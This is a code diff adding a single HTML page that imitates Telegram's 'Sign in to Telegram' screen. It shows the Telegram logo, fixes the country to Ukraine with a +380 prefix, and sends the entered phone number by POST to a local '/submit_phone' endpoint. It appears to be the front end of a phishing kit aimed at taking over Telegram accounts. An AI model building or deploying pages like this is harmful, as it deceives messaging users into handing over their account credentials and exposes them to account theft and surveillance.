@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram Login</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #1c1c1c;
+      font-family: Arial, sans-serif;
+      color: #fff;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 25px;
+    }
+
+    h2 {
+      font-size: 26px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #b0b7c3;
+      margin-bottom: 35px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    label {
+      position: absolute;
+      top: -10px;
+      left: 12px;
+      background-color: #1c1c1c;
+      padding: 0 4px;
+      font-size: 13px;
+      color: #b0b7c3;
+      transition: color 0.3s, border-color 0.3s;
+      z-index: 1;
+    }
+
+    .form-group.focused label,
+    .form-group:hover label {
+      color: #9b83e8;
+    }
+
+    select,
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px 10px 12px 60px;
+      background: transparent;
+      border: 2px solid #444;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 16px;
+      transition: border-color 0.3s;
+      position: relative;
+      z-index: 0;
+      caret-color: #fff;
+    }
+
+    .form-group input:focus,
+    .form-group select:focus {
+      border-color: #9b83e8;
+      outline: none;
+    }
+
+    .form-group.focused input,
+    .form-group:hover input,
+    .form-group.focused select,
+    .form-group:hover select {
+      border-color: #9b83e8;
+    }
+
+    .phone-input {
+      position: relative;
+    }
+
+    .phone-prefix {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #fff;
+      font-size: 16px;
+      pointer-events: none;
+      z-index: 2;
+    }
+
+    .form-group select {
+      appearance: none;
+      background-color: transparent;
+      border: 2px solid #444;
+      padding-left: 60px;
+      position: relative;
+      z-index: 0;
+      color: transparent;
+      cursor: default;
+    }
+
+    #country-group::before {
+      content: "Ukraine";
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #fff;
+      pointer-events: none;
+      font-size: 16px;
+      z-index: 2;
+    }
+
+    #country-group select::-ms-expand {
+      display: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #9b83e8;
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      margin-top: 20px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #8b73d8;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img
+      src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/512px-Telegram_logo.svg.png"
+      alt="Telegram Logo"
+      class="logo"
+    />
+    <h2>Sign in to Telegram</h2>
+    <p>Please confirm your country code and enter your phone number.</p>
+
+    <form action="/submit_phone" method="POST">
+      <div class="form-group" id="country-group">
+        <label for="country">Country</label>
+        <select id="country" disabled>
+          <option value="ua">Ukraine</option>
+        </select>
+      </div>
+
+      <div class="form-group phone-input" id="phone-group">
+        <label for="phone">Phone Number</label>
+        <span class="phone-prefix">+380</span>
+        <input type="tel" id="phone" name="phone" maxlength="14" placeholder="-- --- -- --"/>
+      </div>
+
+      <button type="submit">NEXT</button>
+    </form>
+  </div>
+
+  <script>
+    const phoneInput = document.getElementById("phone");
+    const phoneGroup = document.getElementById("phone-group");
+    const countryGroup = document.getElementById("country-group");
+
+    phoneInput.addEventListener("focus", () => {
+      phoneGroup.classList.add("focused");
+    });
+    phoneInput.addEventListener("blur", () => {
+      phoneGroup.classList.remove("focused");
+    });
+
+    document.getElementById("country").addEventListener("focus", () => {
+      countryGroup.classList.add("focused");
+    });
+    document.getElementById("country").addEventListener("blur", () => {
+      countryGroup.classList.remove("focused");
+    });
+
+    function formatPhone(value) {
+      const digits = value.replace(/\D/g, "").slice(0, 9);
+      let result = "";
+      if (digits.length > 0) result += digits.slice(0, 2);
+      if (digits.length > 2) result += " " + digits.slice(2, 5);
+      if (digits.length > 5) result += " " + digits.slice(5, 7);
+      if (digits.length > 7) result += " " + digits.slice(7, 9);
+      return result;
+    }
+
+    phoneInput.addEventListener("input", () => {
+      const raw = phoneInput.value;
+      const formatted = formatPhone(raw);
+      phoneInput.value = formatted;
+    });
+  </script>
+</body>
+</html>
